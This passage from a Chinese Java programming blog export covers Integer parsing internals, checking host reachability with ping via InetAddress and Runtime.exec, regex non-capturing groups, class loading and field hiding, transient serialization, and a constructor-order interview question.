android-changed</span><br><span class="line">        throw new NumberFormatException(&quot;unable to parse &#x27;&quot;+string+&quot;&#x27; as integer&quot;);</span><br><span class="line">        // END android-changed</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return parse(string, i, radix, negative);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上是两个重载方法，真正转换方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private static int parse(String string, int offset, int radix,</span><br><span class="line">           boolean negative) throws NumberFormatException &#123;</span><br><span class="line">       int max = Integer.MIN_VALUE / radix;</span><br><span class="line">       int result = 0, length = string.length();</span><br><span class="line">       while (offset &lt; length) &#123;</span><br><span class="line">           int digit = Character.digit(string.charAt(offset++), radix);</span><br><span class="line">           if (digit == -1) &#123;</span><br><span class="line">               // BEGIN android-changed</span><br><span class="line">               throw new NumberFormatException(&quot;unable to parse &#x27;&quot;+string+&quot;&#x27; as integer&quot;);</span><br><span class="line">               // END android-changed</span><br><span class="line">           &#125;</span><br><span class="line">           if (max &gt; result) &#123;</span><br><span class="line">               // BEGIN android-changed</span><br><span class="line">               throw new NumberFormatException(&quot;unable to parse &#x27;&quot;+string+&quot;&#x27; as integer&quot;);</span><br><span class="line">               // END android-changed</span><br><span class="line">           &#125;</span><br><span class="line">           int next = result * radix - digit;</span><br><span class="line">           if (next &gt; result) &#123;</span><br><span class="line">               // BEGIN android-changed</span><br><span class="line">               throw new NumberFormatException(&quot;unable to parse &#x27;&quot;+string+&quot;&#x27; as integer&quot;);</span><br><span class="line">               // END android-changed</span><br><span class="line">           &#125;</span><br><span class="line">           result = next;</span><br><span class="line">       &#125;</span><br><span class="line">       if (!negative) &#123;</span><br><span class="line">           result = -result;</span><br><span class="line">           if (result &lt; 0) &#123;</span><br><span class="line">               // BEGIN android-changed</span><br><span class="line">               throw new NumberFormatException(&quot;unable to parse &#x27;&quot;+string+&quot;&#x27; as integer&quot;);</span><br><span class="line">               // END android-changed</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       return result;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>使用java来实现ping功能</title>
    <url>/blog/plang/java/base/ping/</url>
    <content><![CDATA[<p>为了使用java来实现ping的功能,有人推荐使用java的<br>Runtime.exec()方法来直接调用系统的Ping命令,也有人完成了纯Java实现Ping的程序，使用的是Java的NIO包(native<br>io,<br>高效IO包)。但是设备检测只是想测试一个远程主机是否可用。所以，可以使用以下三种方式来实现：</p>
<p>1.Jdk1.5的InetAddresss方式自从Java 1.5，java.net包中就实现了ICMP<br>ping的功能。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String host =  &quot;192.168.1.181&quot;;</span><br><span class="line"> //超时应该在3钞以上</span><br><span class="line">int  timeOut =  3000 ; </span><br><span class="line">// 当返回值是true时，说明host是可用的，反正则不可。</span><br><span class="line">boolean status = InetAddress.getByName(host).isReachable(timeOut);</span><br></pre></td></tr></table></figure>

<p>使用时应注意，如果远程服务器设置了防火墙或相关的配制，可能会影响到结果。另外，由于发送ICMP请求需要程序对系统有一定的权限，当这个权限无法满足时，<br>isReachable方法将试着连接远程主机的TCP端口 7(Echo).<br>经过测试,这种方法测试XP的远程主机很准确，可是，测试Linux的远程主机时却不准确，明明能ping通，却返回false。</p>
<p>2.最简单的办法，直接调用CMD</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">      Runtime.getRuntime().exec(&quot;cmd /c start ping 127.0.0.1&quot;);</span><br><span class="line">     &#125;catch (Exception ex)&#123;</span><br><span class="line">         System.out.println(ex.getMessage());</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>ping的过程,可以显示在本地:使用流来读</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Ping &#123;</span><br><span class="line">    public static void main(String args[]) &#123;</span><br><span class="line">        String line = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            Process pro = Runtime.getRuntime().exec(&quot;ping 127.0.0.1 &quot;);</span><br><span class="line">            BufferedReader buf = new BufferedReader(new InputStreamReader(pro</span><br><span class="line">                    .getInputStream()));</span><br><span class="line">            while ((line = buf.readLine()) != null)</span><br><span class="line">                System.out.println(line);</span><br><span class="line">        &#125; catch (Exception ex) &#123;</span><br><span class="line">            System.out.println(ex.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> </p>
<p>3.Java调用控制台执行ping命令</p>
<p>具体的思路是这样的：通过程序调用类似”ping 192.168.172.1 -n 10 -w <br>4”的命令，这命令会执行ping十次，如果通顺则会输出类似”来自192.168.172.1的回复：字节&#x3D;32<br>时间&#x3D;23ms <br>TTL&#x3D;62”的文本（具体数字根据实际情况会有变化），其中中文是根据环境本地化的，有些机器上的中文部分是英文，但不论是中英文环境，后面的”&#x3D;23ms <br>TTL&#x3D;62”字样总是固定的，它表明一次ping的结果是能通的。如果这个字样出现的次数等于10次即测试的次数，则说明192.168.172.1是百分之百能连通的。技术上：具体调用dos命令用Runtime.getRuntime().exec实现，查看字符串是否符合格式用正则表达式实现，其它不值得赘述，请看具体的程序：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.util.regex.Matcher;</span><br><span class="line">import java.util.regex.Pattern;</span><br><span class="line">public class Pinger &#123;</span><br><span class="line">    /**</span><br><span class="line">     * 要ping的主机</span><br><span class="line">     */</span><br><span class="line">    private String remoteIpAddress;</span><br><span class="line">    /**</span><br><span class="line">     * 设置ping的次数</span><br><span class="line">     */</span><br><span class="line">    private final int pingTimes;</span><br><span class="line">    /**</span><br><span class="line">     * 设置超时</span><br><span class="line">     */</span><br><span class="line">    private int timeOut;</span><br><span class="line">    /**</span><br><span class="line">     * 构造函数</span><br><span class="line">     * </span><br><span class="line">     * @param remoteIpAddress</span><br><span class="line">     * @param pingTimes</span><br><span class="line">     * @param timeOut</span><br><span class="line">     */</span><br><span class="line">    public Pinger(String remoteIpAddress, int pingTimes, int timeOut) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.remoteIpAddress = remoteIpAddress;</span><br><span class="line">        this.pingTimes = pingTimes;</span><br><span class="line">        this.timeOut = timeOut;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 测试是否能ping通</span><br><span class="line">     * @param server</span><br><span class="line">     * @param timeout</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public boolean isReachable() &#123;</span><br><span class="line">        BufferedReader in = null;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        // 将要执行的ping命令,此命令是windows格式的命令</span><br><span class="line">        String pingCommand = &quot;ping &quot; + remoteIpAddress + &quot; -n &quot; + pingTimes+ &quot; -w &quot; + timeOut;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 执行命令并获取输出</span><br><span class="line">            System.out.println(pingCommand);</span><br><span class="line">            Process p = r.exec(pingCommand);</span><br><span class="line">            if (p == null) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            in = new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line">            // 逐行检查输出,计算类似出现=23ms TTL=62字样的次数</span><br><span class="line">            int connectedCount = 0;</span><br><span class="line">            String line = null;</span><br><span class="line">            while ((line = in.readLine()) != null) &#123;</span><br><span class="line">                connectedCount += getCheckResult(line);</span><br><span class="line">            &#125;</span><br><span class="line">            // 如果出现类似=23ms TTL=62这样的字样,出现的次数=测试次数则返回真</span><br><span class="line">            return connectedCount == pingTimes;</span><br><span class="line">        &#125; catch (Exception ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">            // 出现异常则返回假</span><br><span class="line">            return false;</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                in.close();</span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * 若line含有=18ms TTL=16字样,说明已经ping通,返回1,否則返回0.</span><br><span class="line">     * @param line</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    private static int getCheckResult(String line) &#123;</span><br><span class="line">        // System.out.println(&quot;控制台输出的结果为:&quot;+line);</span><br><span class="line">        Pattern pattern = Pattern.compile(&quot;(\\d+ms)(\\s+)(TTL=\\d+)&quot;,</span><br><span class="line">                Pattern.CASE_INSENSITIVE);</span><br><span class="line">        Matcher matcher = pattern.matcher(line);</span><br><span class="line">        while (matcher.find()) &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Pinger p = new Pinger(&quot;172.16.17.224&quot;, 1, 5000);</span><br><span class="line">        System.out.println(p.isReachable());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>java正则表达式之非捕获组(?:X)</title>
    <url>/blog/plang/java/base/regex-fbhz/</url>
    <content><![CDATA[<p>Java正则表达式中的捕获组概念，大家都接触过，如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String regex = &quot;(abc)&quot;;</span><br></pre></td></tr></table></figure>

<p>字符串abc就是一个捕获组，表示把abc当成一个组去和字符串匹配，以上等价的表达式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String regex = &quot;abc&quot;;</span><br></pre></td></tr></table></figure>

<p>捕获组可以通过从左到右计算其开括号来编号，编号从1开始；不过零组总是表示整个表达式。<br>好了，捕获组的概念就介绍这里，现在说说非捕获组，JavaAPI中介绍 (?:X) <br>X，作为非捕获组。听起来可能感觉挺奇怪的X作为非捕获组，什么意思呢？这个说起来和Java正则表达式解析的原理有点关系呢。<br>正则表达式在解析的会现分析正则的捕获组，<strong>解析器会把正则的中的每个捕获组都和解析的字符串进行匹配并把结果存放到内存中。</strong>其实在现实应用中我们可能要匹配一个正则，我们紧紧需要知道是否匹配成功，但是不需要知道是哪个子字符串匹配成功，这样了<strong>为了节省内存</strong>就用到了(?:X)，它表示子正则X的匹配结果不需要保留在内存中，这在高并发和大文本处理中会明显的<strong>减少String对象的创建</strong>。</p>
<p>如：现在我们要分解一个HTML文本中的td,条件是td带有属性class，那么我们可以这么写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String regex = &quot;&lt;td (?:class=\\w*)&gt;.*&lt;/td&gt;&quot;;</span><br><span class="line">String ss = &quot;&lt;tr&gt; &lt;td class=red&gt;sss&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">Pattern pattern = Pattern.compile(regex);</span><br><span class="line">Matcher matcher = pattern.matcher(ss);</span><br><span class="line">System.out.println(&quot;捕获组数量：&quot; + matcher.groupCount());</span><br><span class="line">while(matcher.find()) </span><br><span class="line">&#123;</span><br><span class="line">    System.out.println(matcher.group());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> </p>
<p>最后输出的内容为：</p>
<p>捕获组数量：0</p>
<p>&lt;td&gt;sss&lt;&#x2F;td&gt; &lt;td&gt;&lt;&#x2F;td&gt;</p>
<p>由此可以看出正则regex匹配成功，但是整个表达式中捕获组的数量确实为0。以上例子可能不是最优的，紧紧是为了说明此问题。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA类机制思考</title>
    <url>/blog/plang/java/base/thinkofclass/</url>
    <content><![CDATA[<h2 id="测试所用类"><a href="#测试所用类" class="headerlink" title="测试所用类"></a>测试所用类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Class1</span><br><span class="line">&#123;</span><br><span class="line">    public static String inits = &quot;init String in class2&quot;;</span><br><span class="line">    static</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;init Class1&quot;);</span><br><span class="line">        System.out.println(inits);</span><br><span class="line">    &#125;</span><br><span class="line">    public String s = &quot;in class1&quot;;</span><br><span class="line"></span><br><span class="line">    public Class1()</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;create Class1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void print()</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;s in class1=&quot; + s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Class2 extends Class1</span><br><span class="line">&#123;</span><br><span class="line">    public static String inits = &quot;init String in class2&quot;;</span><br><span class="line">    static</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;init Class2&quot;);</span><br><span class="line">        System.out.println(inits);</span><br><span class="line">    &#125;</span><br><span class="line">    public String s = &quot;in class2&quot;;</span><br><span class="line"></span><br><span class="line">    public Class2()</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;create Class2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void print()</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;s in class2=&quot; + s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class Class3 extends Class2</span><br><span class="line">&#123;</span><br><span class="line">    public static String inits = &quot;init String in class3&quot;;</span><br><span class="line">    static</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;init Class3&quot;);</span><br><span class="line">        System.out.println(inits);</span><br><span class="line">    &#125;</span><br><span class="line">    public String s = &quot;in class3&quot;;</span><br><span class="line"></span><br><span class="line">    public Class3()</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;create Class3&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>对象是属性的无序集合，每个属性存放一个原始值、对象或者函数。</p>
<p>构造方法只是初始代码对象状态的方法，对象的创建是在其调用前完成的。</p>
<p>对象的创建过程包括创建属性集合并把属性加进去。</p>
<h2 id="类对象"><a href="#类对象" class="headerlink" title="类对象"></a>类对象</h2><p>JAVA的类其实也是一种对象，类型为Class，在加载时创建其名字空间，会初始化其中的静态变量，执行静态代码块。父类会先于子类加载，因为子类的初始化可能会依赖于父类。类对象中的各种属性一般不会用，在用反射和代理时会明显感觉到类中的方法、注释等都为属性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class.forName(&quot;Class3&quot;);</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">init Class1</span><br><span class="line">init String in class2</span><br><span class="line">init Class2</span><br><span class="line">init String in class2</span><br><span class="line">init Class3</span><br><span class="line">init String in class3</span><br></pre></td></tr></table></figure>

<h2 id="属性集合"><a href="#属性集合" class="headerlink" title="属性集合"></a>属性集合</h2><p>JAVA的对象创建会从父到子创建多个属性集合，它们有继承关系。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class3 c3=new Class3();</span><br><span class="line">System.out.println(c3.s);</span><br><span class="line">System.out.println(((Class2)c3).s);</span><br><span class="line">System.out.println(((Class1)c3).s);</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">…//类加载部分</span><br><span class="line">create Class1</span><br><span class="line">create Class2</span><br><span class="line">create Class3</span><br><span class="line">String in class3</span><br><span class="line">String in class2</span><br><span class="line">String in class1</span><br></pre></td></tr></table></figure>

<p>可以看到父类到子类的构造方法都被调用了，这说明父类和子类都创建了属性集合，要不然没必要初始化。</p>
<p>再看输出的字符串就说明了上述问题，通过强制类型转换可以调用父属性集合中的同名属性，这也说明属性的搜索机制是从子到父的。</p>
<p>再看一个问题，Class1中有一个叫prop的属性为int，Class2中也有一个prop的属性为String，有问题吗？一定没有，因为是两个互不干扰的属性集合。</p>
<h2 id="方法集合"><a href="#方法集合" class="headerlink" title="方法集合"></a>方法集合</h2><p>方法也一种属性，只不过是属于类对象，在普通对象中没有的。那一般对象怎么调用方法呢？</p>
<p>看一个用反射调用方法的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class cls = Class.forName(&quot;ClassTest&quot;);</span><br><span class="line">Class partypes[] = new Class[2];</span><br><span class="line">partypes[0] = Integer.TYPE;</span><br><span class="line">partypes[1] = Integer.TYPE;</span><br><span class="line">Method meth = cls.getMethod(&quot;add&quot;, partypes);</span><br><span class="line">ClassTest methobj = new ClassTest();</span><br><span class="line">Object arglist[] = new Object[2];</span><br><span class="line">arglist[0] = new Integer(37);</span><br><span class="line">arglist[1] = new Integer(47);</span><br><span class="line">Object retobj = meth.invoke(methobj, arglist);</span><br></pre></td></tr></table></figure>

<p>通过forName得到类对象，再通过类对象、方法名、方法参数得到指定方法（JAVA重载会产生同名异参的方法），最后invoke为什么第一个参数要为ClassTest的对象呢？</p>
<p>JAVA中的一般对象只是数据的集合，方法全放到类对象中，一般对象调用方法最后会把自己传递给自己类对象中的方法，作为方法运行所需数据。</p>
<p>这也就是JAVA中this的来源，类中非静态方法第一个参数都是一个隐藏的本类的对象，这个参数名为this。静态的方法可以直接调用，不用对象中的数据，所以就没有this这个参数了。</p>
<h2 id="方法覆盖"><a href="#方法覆盖" class="headerlink" title="方法覆盖"></a>方法覆盖</h2><p>JAVA中只有单继承，程序架构基于接口实现，所以出现了动态联编，方法最终会调用末端子类中的方法，方法所用属性集合也为方法所在类的类型。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class3 c3=new Class3();</span><br><span class="line">c3.print();</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">…</span><br><span class="line">s in class2=String in class2</span><br></pre></td></tr></table></figure>

<p>可见最终执行的方法是Class2中的print，用的属性也是Class2类型的属性集合（创建c3时创建的）。</p>
<p>要想调用父类中被覆盖的方法可以用super关键字，如super.print()。</p>
<p>这里也说明方法不会调用子类中的同名属性，只会向上搜索。</p>
<h2 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h2><p><a href="/blog/uploads/2012/11/java-class.png"><img src="/blog/uploads/2012/11/java-class.png" title="java-class">{.alignnone<br>.wp-image-153}</a></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA transient关键字与序列化</title>
    <url>/blog/plang/java/base/transient/</url>
    <content><![CDATA[<h2 id="transient的作用及使用方法"><a href="#transient的作用及使用方法" class="headerlink" title="transient的作用及使用方法"></a>transient的作用及使用方法</h2><p>我们都知道一个对象只要实现了Serilizable接口，这个对象就可以被序列化，java的这种序列化模式为开发者提供了很多便利，我们可以不必关系具体序列化的过程，只要这个类实现了Serilizable接口，这个类的所有属性和方法都会自动序列化。</p>
<p>然而在实际开发过程中，我们常常会遇到这样的问题，这个类的有些属性需要序列化，而其他属性不需要被序列化，打个比方，如果一个用户有一些敏感信息（如密码，银行卡号等），为了安全起见，不希望在网络操作（主要涉及到序列化操作，本地序列化缓存也适用）中被传输，这些信息对应的变量就可以加上transient关键字。换句话说，这个字段的生命周期仅存于调用者的内存中而不会写到磁盘里持久化。</p>
<p>总之，java<br>的transient关键字为我们提供了便利，你只需要实现Serilizable接口，将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会序列化到指定的目的地中。</p>
<p>示例code如下：</p>
<pre><code>import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

/**
 * @description 使用transient关键字不序列化某个变量
 *        注意读取的时候，读取数据的顺序一定要和存放数据的顺序保持一致
 *        
 * @author Alexia
 * @date  2013-10-15
 */
public class TransientTest &#123;
    
    public static void main(String[] args) &#123;
        
        User user = new User();
        user.setUsername(&quot;Alexia&quot;);
        user.setPasswd(&quot;123456&quot;);
        
        System.out.println(&quot;read before Serializable: &quot;);
        System.out.println(&quot;username: &quot; + user.getUsername());
        System.err.println(&quot;password: &quot; + user.getPasswd());
        
        try &#123;
            ObjectOutputStream os = new ObjectOutputStream(
                    new FileOutputStream(&quot;C:/user.txt&quot;));
            os.writeObject(user); // 将User对象写进文件
            os.flush();
            os.close();
        &#125; catch (FileNotFoundException e) &#123;
            e.printStackTrace();
        &#125; catch (IOException e) &#123;
            e.printStackTrace();
        &#125;
        try &#123;
            ObjectInputStream is = new ObjectInputStream(new FileInputStream(
                    &quot;C:/user.txt&quot;));
            user = (User) is.readObject(); // 从流中读取User的数据
            is.close();
            
            System.out.println(&quot;\nread after Serializable: &quot;);
            System.out.println(&quot;username: &quot; + user.getUsername());
            System.err.println(&quot;password: &quot; + user.getPasswd());
            
        &#125; catch (FileNotFoundException e) &#123;
            e.printStackTrace();
        &#125; catch (IOException e) &#123;
            e.printStackTrace();
        &#125; catch (ClassNotFoundException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;

class User implements Serializable &#123;
    private static final long serialVersionUID = 8294180014912103005L;  
    
    private String username;
    private transient String passwd;
    
    public String getUsername() &#123;
        return username;
    &#125;
    
    public void setUsername(String username) &#123;
        this.username = username;
    &#125;
    
    public String getPasswd() &#123;
        return passwd;
    &#125;
    
    public void setPasswd(String passwd) &#123;
        this.passwd = passwd;
    &#125;

&#125;
</code></pre>
<p>输出为：</p>
<pre><code>read before Serializable: 
username: Alexia
password: 123456

read after Serializable: 
username: Alexia
password: null
</code></pre>
<p>密码字段为null，说明反序列化时根本没有从文件中获取到信息。</p>
<h2 id="transient使用小结"><a href="#transient使用小结" class="headerlink" title="transient使用小结"></a>transient使用小结</h2><p>1）一旦变量被transient修饰，变量将不再是对象持久化的一部分，该变量内容在序列化后无法获得访问。</p>
<p>2）transient关键字只能修饰变量，而不能修饰方法和类。注意，本地变量是不能被transient关键字修饰的。变量如果是用户自定义类变量，则该类需要实现Serializable接口。</p>
<p>3）被transient关键字修饰的变量不再能被序列化，一个静态变量不管是否被transient修饰，均不能被序列化。</p>
<p>第三点可能有些人很迷惑，因为发现在User类中的username字段前加上static关键字后，程序运行结果依然不变，即static类型的username也读出来为”Alexia”了，这不与第三点说的矛盾吗？实际上是这样的：第三点确实没错（一个静态变量不管是否被transient修饰，均不能被序列化），反序列化后类中static型变量username的值为当前JVM中对应static变量的值，这个值是JVM中的不是反序列化得出的，不相信？好吧，下面我来证明：</p>
<pre><code>import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

/**
 * @description 使用transient关键字不序列化某个变量
 *        注意读取的时候，读取数据的顺序一定要和存放数据的顺序保持一致
 *        
 * @author Alexia
 * @date  2013-10-15
 */
public class TransientTest &#123;
    
    public static void main(String[] args) &#123;
        
        User user = new User();
        user.setUsername(&quot;Alexia&quot;);
        user.setPasswd(&quot;123456&quot;);
        
        System.out.println(&quot;read before Serializable: &quot;);
        System.out.println(&quot;username: &quot; + user.getUsername());
        System.err.println(&quot;password: &quot; + user.getPasswd());
        
        try &#123;
            ObjectOutputStream os = new ObjectOutputStream(
                    new FileOutputStream(&quot;C:/user.txt&quot;));
            os.writeObject(user); // 将User对象写进文件
            os.flush();
            os.close();
        &#125; catch (FileNotFoundException e) &#123;
            e.printStackTrace();
        &#125; catch (IOException e) &#123;
            e.printStackTrace();
        &#125;
        try &#123;
            // 在反序列化之前改变username的值
            User.username = &quot;jmwang&quot;;
            
            ObjectInputStream is = new ObjectInputStream(new FileInputStream(
                    &quot;C:/user.txt&quot;));
            user = (User) is.readObject(); // 从流中读取User的数据
            is.close();
            
            System.out.println(&quot;\nread after Serializable: &quot;);
            System.out.println(&quot;username: &quot; + user.getUsername());
            System.err.println(&quot;password: &quot; + user.getPasswd());
            
        &#125; catch (FileNotFoundException e) &#123;
            e.printStackTrace();
        &#125; catch (IOException e) &#123;
            e.printStackTrace();
        &#125; catch (ClassNotFoundException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;

class User implements Serializable &#123;
    private static final long serialVersionUID = 8294180014912103005L;  
    
    public static String username;
    private transient String passwd;
    
    public String getUsername() &#123;
        return username;
    &#125;
    
    public void setUsername(String username) &#123;
        this.username = username;
    &#125;
    
    public String getPasswd() &#123;
        return passwd;
    &#125;
    
    public void setPasswd(String passwd) &#123;
        this.passwd = passwd;
    &#125;

&#125;
</code></pre>
<p>运行结果为：</p>
<pre><code>read before Serializable: 
username: Alexia
password: 123456

read after Serializable: 
username: jmwang
password: null
</code></pre>
<p>这说明反序列化后类中static型变量username的值为当前JVM中对应static变量的值，为修改后jmwang，而不是序列化时的值Alexia。</p>
<h2 id="transient使用细节——被transient关键字修饰的变量真的不能被序列化吗？"><a href="#transient使用细节——被transient关键字修饰的变量真的不能被序列化吗？" class="headerlink" title="transient使用细节——被transient关键字修饰的变量真的不能被序列化吗？"></a>transient使用细节——被transient关键字修饰的变量真的不能被序列化吗？</h2><p>思考下面的例子：</p>
<pre><code>import java.io.Externalizable;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInput;
import java.io.ObjectInputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;

/**
 * @descripiton Externalizable接口的使用
 * 
 * @author Alexia
 * @date 2013-10-15
 *
 */
public class ExternalizableTest implements Externalizable &#123;

    private transient String content = &quot;是的，我将会被序列化，不管我是否被transient关键字修饰&quot;;

    @Override
    public void writeExternal(ObjectOutput out) throws IOException &#123;
        out.writeObject(content);
    &#125;

    @Override
    public void readExternal(ObjectInput in) throws IOException,
            ClassNotFoundException &#123;
        content = (String) in.readObject();
    &#125;

    public static void main(String[] args) throws Exception &#123;
        
        ExternalizableTest et = new ExternalizableTest();
        ObjectOutput out = new ObjectOutputStream(new FileOutputStream(
                new File(&quot;test&quot;)));
        out.writeObject(et);

        ObjectInput in = new ObjectInputStream(new FileInputStream(new File(
                &quot;test&quot;)));
        et = (ExternalizableTest) in.readObject();
        System.out.println(et.content);

        out.close();
        in.close();
    &#125;
&#125;
</code></pre>
<p>content变量会被序列化吗？好吧，我把答案都输出来了，是的，运行结果就是：</p>
<pre><code>是的，我将会被序列化，不管我是否被transient关键字修饰
</code></pre>
<p>这是为什么呢，不是说类的变量被transient关键字修饰以后将不能序列化了吗？</p>
<p>我们知道在Java中，对象的序列化可以通过实现两种接口来实现，若实现的是Serializable接口，则所有的序列化将会自动进行，若实现的是Externalizable接口，则没有任何东西可以自动序列化，需要在writeExternal方法中进行手工指定所要序列化的变量，这与是否被transient修饰无关。因此第二个例子输出的是变量content初始化的内容，而不是null。</p>
<p>转自：<a href="http://www.cnblogs.com/lanxuezaipiao/p/3369962.html">http://www.cnblogs.com/lanxuezaipiao/p/3369962.html</a></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>BASE</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>携程Java工程师的一道试题</title>
    <url>/blog/plang/java/base/xcmst/</url>
    <content><![CDATA[<p>原题：求这段程序的输出。</p>
<pre><code>public class Base &#123;
    private String baseName=  &quot;base&quot;;
    public Base() &#123;
        callName();
    &#125;
    public void callName()&#123;
        System.out.println(baseName);
    &#125;
    
    static class Sub extends Base&#123;
        private String baseName = &quot;sub&quot;;
        public void callName()&#123;
            System.out.println(baseName);
        &#125;
    &#125;
    public static void main(String[] args) &#123;
        Base b = new Sub();
        System.out.println(b);
    &#125;
&#125;
</code></pre>
<p>解答此题关键在于理解和掌握类的加载过程以及子类继承父类后，重写方法的调用问题：</p>
<p>从程序的执行顺序去解答：</p>
<p>1、Base b &#x3D; new Sub();</p>
<p>声明父类变量b对子类的引用，JAVA类加载器将Base,Sub类加载到JVM;</p>
<p>2、JVM为Base,Sub 的的成员开辟内存空间</p>
<p>此时，Base 和Sub类中的值为null;</p>
<p>3、new sub()</p>
<p>调用构造函数，由于Sub类继承自Base而无自定义构造器，因此先调用父类Base的无参构造；</p>
<p>4、父类午餐构造的本质为：</p>
<pre><code>public Base()&#123;

　　baseName= &quot;base&quot;;

　　callName();

    &#125;
</code></pre>
<p>即将父类的baseName赋值为”base”,赋值后调用callName();</p>
<p>5、callName 在子类中被重写，因此调用子类的callName();</p>
<p>6、调用子类的callName，打印baseName</p>
<p>此baseName为子类Sub的成员变量，而此时该成员尚未初始化，因此为Null;</p>
<p>7、实际上在new Sub()时，实际执行过程为：</p>
<pre><code>public Sub()&#123;

    　　super();

　　　baseName = &quot;sub&quot;; 

    &#125;
</code></pre>
<p>可见，在baseName &#x3D;<br>&quot;sub&quot;执行前，子类的callName()已经执行，所以子类的baseName为默认值状态null;</p>
